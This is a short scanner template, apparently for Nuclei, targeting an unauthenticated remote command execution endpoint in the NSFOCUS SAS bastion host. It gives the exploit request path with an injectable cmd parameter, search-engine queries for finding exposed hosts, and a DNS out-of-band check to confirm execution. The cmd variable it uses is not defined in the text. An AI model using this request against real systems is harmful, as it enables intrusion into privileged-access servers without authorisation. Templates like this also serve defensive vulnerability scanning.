id: Nsfocus-SAS-rce

info:
  name: Nsfocus-SAS-rce
  author: hufei
  severity: critical
  description: |
     绿盟 SAS堡垒机 Exec 远程命令执行漏洞
  reference:
    https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
  metadata:
    max-request: 3
    fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
    hunter-query: app.name="NSFOCUS 绿盟 SAS"
    verified: true
  tags: 2023,HVV,Nsfocus-SAS,login-bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/webconf/Exec/index?cmd={{cmd}}"

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and